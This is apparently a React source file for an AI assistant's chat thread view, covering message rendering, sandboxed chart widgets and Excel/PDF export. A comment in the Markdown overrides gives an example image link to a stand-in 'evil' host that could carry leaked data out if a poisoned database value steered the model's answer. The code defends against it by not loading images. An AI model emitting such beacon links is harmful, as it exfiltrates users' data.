import { useEffect, useRef, useState } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { Sparkles, Paperclip, Download, FileSpreadsheet, FileText, Loader2 } from 'lucide-react'
import Composer from './Composer'
import { Widget } from '../SandboxedWidget'
import { exportRows, exportDashboard, exportData } from '../api'

// Markdown overrides: open links safely; let wide result tables scroll.
const MD_COMPONENTS = {
  a: ({ node, ...props }) => <a target="_blank" rel="noopener noreferrer" {...props} />,
  table: ({ node, ...props }) => <div className="table-wrap"><table {...props} /></div>,
  // Do NOT auto-load markdown images. Answers are text/tables (real visuals go
  // through the sandboxed widget path), so a `![](https://evil/?leak=…)` that a
  // poisoned DB value slipped into the answer would just be an exfil beacon.
  // Render the alt text instead of fetching the src.
  img: ({ node, alt }) => (alt ? <em>{alt}</em> : null),
}

/*
 * Thread — the active chat view. Messages scroll above a docked composer.
 * User turns are filled violet bubbles; assistant turns render the answer as
 * Markdown. An Export control appears only when the backend returned an
 * export query for that answer (i.e. there's tabular data worth exporting).
 */
export default function Thread({ messages, isStreaming, status, composerProps, onWidgetPrompt }) {
  const endRef = useRef(null)
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [messages, status])

  return (
    <div className="flex h-full flex-col">
      <div className="scroll-quiet flex-1 overflow-y-auto">
        <div className="mx-auto flex w-full max-w-[820px] flex-col gap-5 px-4 py-8 sm:px-6">
          {messages.map((m) =>
            m.role === 'user' ? (
              <div key={m.id} className="flex flex-col items-end gap-1.5">
                {m.attachments?.length > 0 && (
                  <div className="flex flex-wrap justify-end gap-1.5">
                    {m.attachments.map((a, ai) => (
                      <span
                        key={ai}
                        className="inline-flex items-center gap-1.5 rounded-lg border border-line bg-white px-2 py-1 text-[0.74rem] text-text-muted"
                      >
                        <Paperclip className="h-3 w-3" />
                        {a.name}
                      </span>
                    ))}
                  </div>
                )}
                {m.content && (
                  <div className="max-w-[85%] rounded-2xl rounded-br-md bg-gradient-to-br from-[#A582EA] to-[#8B5CF6] px-4 py-2.5 text-[0.94rem] leading-relaxed text-white">
                    {m.content}
                  </div>
                )}
              </div>
            ) : (
              <div key={m.id} className="flex gap-3">
                <span className="mt-0.5 grid h-7 w-7 flex-none place-items-center rounded-full bg-gradient-to-br from-[#C9B6F5] to-[#A582EA] text-white">
                  <Sparkles className="h-3.5 w-3.5" />
                </span>
                <div className="min-w-0 flex-1 pt-0.5">
                  {m.content ? (
                    <>
                      <div className="markdown">
                        <ReactMarkdown remarkPlugins={[remarkGfm]} components={MD_COMPONENTS}>
                          {m.content}
                        </ReactMarkdown>
                      </div>
                      {/* Inline charts/graphs the model drew (sandboxed iframe) */}
                      {m.widgets?.map((w, wi) => (
                        <Widget key={wi} code={w.code} title={w.title} onPrompt={onWidgetPrompt} />
                      ))}
                      {/* Export only on a successful answer with real captured data
                          (never on a stopped/errored/empty turn). A dashboard turn
                          offers BOTH: the whole dashboard (KPIs + every chart) AND
                          the underlying data rows — hiding either loses data. */}
                      {m.ok !== false &&
                        (m.widgets?.some((w) => w.kind === 'dashboard' && w.data) ||
                          m.exportRows?.length > 0 ||
                          (m.exportTruncated && m.exportQuery)) && (
                          <ExportControl
                            columns={m.exportColumns}
                            rows={m.exportRows}
                            dashboard={m.widgets?.find((w) => w.kind === 'dashboard' && w.data)?.data}
                            truncated={!!m.exportTruncated}
                            exportQuery={m.exportQuery}
                          />
                        )}
                    </>
                  ) : isStreaming ? (
                    <div className="flex items-center gap-2 text-[0.86rem] text-text-muted">
                      <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-line border-t-accent" />
                      {status || 'Thinking…'}
                    </div>
                  ) : (
                    // Empty assistant message but NOT streaming (e.g. a turn cut
                    // off by a tab close/refresh) -> an honest note, not a
                    // spinner that would otherwise hang forever.
                    <div className="text-[0.86rem] italic text-text-muted">No response — please try again.</div>
                  )}
                </div>
              </div>
            ),
          )}
          <div ref={endRef} />
        </div>
      </div>

      {/* Docked composer */}
      <div className="border-t border-line bg-bg px-4 py-3.5 sm:px-6">
        <div className="mx-auto w-full max-w-[820px]">
          <Composer {...composerProps} />
        </div>
      </div>
    </div>
  )
}

// Conditional export — Excel / PDF.
//   Data:      the EXACT rows behind the answer. If this thread was reopened and
//              the stored snapshot was trimmed (exportTruncated), the button
//              RE-RUNS the captured query via /export so the file is COMPLETE —
//              a trimmed snapshot must never masquerade as the full download.
//   Dashboard: the whole dashboard (KPIs + every chart section + its data)
//              via /export_dashboard. A dashboard turn offers BOTH groups.
function ExportControl({ columns, rows, dashboard, truncated, exportQuery }) {
  const [busy, setBusy] = useState(null) // 'data-excel' | 'dash-pdf' | ... | null

  async function run(kind, format) {
    const key = `${kind}-${format}`
    if (busy) return
    setBusy(key)
    try {
      if (kind === 'dash') {
        await exportDashboard(dashboard, format)
      } else if (truncated && exportQuery) {
        // Stored snapshot is incomplete -> re-run the exact query for full data.
        await exportData(exportQuery, format)
      } else {
        await exportRows(columns || [], rows || [], format)
      }
    } catch {
      alert('Export failed — please try again in a moment.')
    } finally {
      setBusy(null)
    }
  }

  const btn = (kind, format, Icon, label) => (
    <button
      type="button"
      onClick={() => run(kind, format)}
      disabled={!!busy}
      className="inline-flex items-center gap-1.5 rounded-lg border border-line bg-white px-2.5 py-1 text-[0.76rem] font-medium text-text transition hover:border-accent hover:text-accent disabled:opacity-50"
    >
      {busy === `${kind}-${format}` ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Icon className="h-3.5 w-3.5" />}
      {label}
    </button>
  )

  const hasData = rows?.length > 0 || (truncated && exportQuery)
  // Old saved thread with a trimmed snapshot and no stored query: full data is
  // unrecoverable — say so on the button instead of pretending it's complete.
  const partial = truncated && !exportQuery
  const dataLabel = (base) => (partial ? `${base} (first ${rows?.length || 0} rows)` : base)
  return (
    <div className="mt-3 flex flex-wrap items-center gap-2">
      <span className="inline-flex items-center gap-1 text-[0.74rem] text-text-muted">
        <Download className="h-3.5 w-3.5" /> Export
      </span>
      {hasData && btn('data', 'excel', FileSpreadsheet, dataLabel(dashboard ? 'Data Excel' : 'Excel'))}
      {hasData && btn('data', 'pdf', FileText, dataLabel(dashboard ? 'Data PDF' : 'PDF'))}
      {dashboard && btn('dash', 'excel', FileSpreadsheet, 'Dashboard Excel')}
      {dashboard && btn('dash', 'pdf', FileText, 'Dashboard PDF')}
    </div>
  )
}
